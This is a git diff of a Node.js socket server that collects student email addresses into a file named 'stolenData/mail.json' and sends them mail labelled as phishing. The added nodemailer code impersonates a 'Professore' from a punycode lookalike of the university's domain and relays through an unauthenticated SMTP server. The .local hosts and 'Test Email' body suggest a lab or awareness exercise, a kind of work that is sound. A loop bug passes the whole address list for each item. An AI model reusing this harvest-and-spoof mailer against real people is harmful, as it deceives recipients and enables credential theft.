@@ -1,10 +1,10 @@
 const http = require('http');
 const express = require('express');
 const socketIo = require('socket.io');
-const axios = require('axios');
 const fs = require('fs');
 const path = require('path');
 const { exec } = require('child_process');
+const nodemailer = require('nodemailer');
 
 const app = express();
 const server = http.createServer(app);
@@ -108,8 +108,8 @@ io.on('connection', (socket) => {
             if (err || stats.size === 0) {
                 console.error('The JSON file is empty or corrupt, initializing as an empty array');
                 const newData = [
-                    { email: data.student1.email, phishing_sent: false },
-                    { email: data.student2.email, phishing_sent: false }
+                    { email: data.student1.email/*, phishing_sent: false */},
+                    { email: data.student2.email/*, phishing_sent: false */}
                 ];
                 writeDataToFile(filePath, newData);
             } else {
@@ -141,7 +141,7 @@ io.on('connection', (socket) => {
                     else if (data.student1.email == "") {
                         console.log(`Email ${data.student1.email} not inserted (probably no student near).`);
                     } else {
-                        jsonData.push({ email: data.student1.email, phishing_sent: false });
+                        jsonData.push({ email: data.student1.email/*, phishing_sent: fals*/ });
                         toBeSend.push(data.student1.email);
                         //console.log("toBeSend: ", toBeSend); // Output: "string"
                     }
@@ -154,19 +154,15 @@ io.on('connection', (socket) => {
                     else if (data.student2.email == "") {
                         console.log(`Email ${data.student2.email} not inserted (probably no student near).`);
                     } else {
-                        jsonData.push({ email: data.student2.email, phishing_sent: false });
-                        // console.log("\n");
-                        // console.log("data.student2.email: ", data.student2.email); // Output: "student2@example.com"
-                        // console.log("typof: ", typeof data.student2.email); // Output: "string"
+                        jsonData.push({ email: data.student2.email/*, phishing_sent: false */});
 
-                        // let mail2 = data.student2.email;
                         toBeSend.push(data.student2.email);
 
                     }
 
                     // Write the updated array to the JSON file
                     writeDataToFile(filePath, jsonData);
-                    sendMailto(toBeSend);
+                    sendMail(toBeSend);
                 });
             }
         });
@@ -185,14 +181,14 @@ function writeDataToFile(filePath, data) {
 }
 
 /////////// SEND PHISHING MAILS ///////////
-function sendMailto(toBeSend)
+function sendMail(toBeSend)
 {
     if (typeof toBeSend === 'string') {
-        console.log("mail a cui inviare il phishing: ", toBeSend);
+        console.log("email addresses to send phishing to: ", toBeSend);
         sendSingleMail(toBeSend);
     } 
     else if (Array.isArray(toBeSend)) {
-        console.log("mail a cui inviare il phishing: ", toBeSend);
+        console.log("email addresses to send phishing to: ", toBeSend);
         toBeSend.forEach(item => {
             sendSingleMail(toBeSend);
         });
@@ -203,18 +199,71 @@ function sendMailto(toBeSend)
 
 function sendSingleMail(mailAddress)
 {
-     // TO DO: send mail !!
+      // Create a transporter using the host and port of your SMTP server
+  let transporter = nodemailer.createTransport({
+    host: 'smtp.units.local', // replace with your SMTP server host
+    port: 25, // the port of your SMTP server
+    secure: false, // true for 465, false for other ports
+    // If needed, add authentication
+    // auth: {
+    //   user: 'username',
+    //   pass: 'password'
+    // }
+  });
+
+  // Define email options
+  let mailOptions = {
+    from: 'Professore <professore@xn--unts-mza.local>', // Sender address
+    to: mailAddress, // Recipient address
+    subject: 'Test Email', // Subject line
+    text: 'Test email body' // Plain text body
+  };
+
+  // Send the email
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      return console.log(error);
+    }
+    console.log('Email sent: ' + info.response);
+  });
+    // console.log("DENTRO sendSingleMail: mail a cui inviare il phishing: ", mailAddress);
+
+    //     // Sender's email configuration
+    //     const transporter = nodemailer.createTransport({
+    //         host: 'localhost', // Indirizzo del tuo server di posta locale
+    //         port: 25, // Porta SMTP del tuo server di posta locale
+    //         tls: {
+    //             rejectUnauthorized: false // Disabilita la verifica dell'autenticità del certificato TLS (da rimuovere in produzione)
+    //         }
+    //     });
+
+    //     // Email content
+    //     const mailOptions = {
+    //         from: 'your_email@yourdomain.com', // L'indirizzo email del mittente
+    //         to: mailAddress, // L'indirizzo email del destinatario
+    //         subject: 'Test Email', // Oggetto dell'email
+    //         text: 'This is a test email sent from Node.js.' // Contenuto dell'email
+    //     };
+
+    //     // Invio dell'email
+    //     transporter.sendMail(mailOptions, function(error, info) {
+    //         if (error) {
+    //             console.error('Error occurred:', error);
+    //         } else {
+    //             console.log('Email sent:', info.response);
+    //         }
+    //     });
 }
 
 /////////// MAIN //////////////////
 const emailAddress = process.argv[2]; 
 initializeJsonFile("stolenData/mail.json", emailAddress);
-sendMailto(emailAddress);
+sendMail(emailAddress);
 
 function initializeJsonFile(filePath, emailAddress) {
     const data = [{
-        email: emailAddress,
-        phishing_sent: true
+        email: emailAddress
+        /*phishing_sent: true*/
     }];
 
     // Convertire l'oggetto JSON in formato stringa
@@ -223,18 +272,18 @@ function initializeJsonFile(filePath, emailAddress) {
     // Verificare se il file esiste già
     fs.stat(filePath, (err, stats) => {
         if (err) {
-            console.error('Errore durante la verifica del file:', err);
+            console.error('Error while checking the file:', err);
         } else {
             if (stats.size === 0) {
                 fs.writeFile(filePath, jsonData, (err) => {
                     if (err) {
-                        console.error('Errore durante la scrittura del file:', err);
+                        console.error('Error while writing the file:', err);
                     } else {
-                        console.log(`Dati JSON scritti con successo in ${filePath}.`);
+                        console.log(`JSON data successfully written in ${filePath}.`);
                     }
                 });
             } else {
-                console.log(`Il file ${filePath} non è vuoto, quindi non verrà sovrascritto.`);
+                console.log(`The file ${filePath} is not empty, so it will not be overwritten.`);
             }
         }
     });
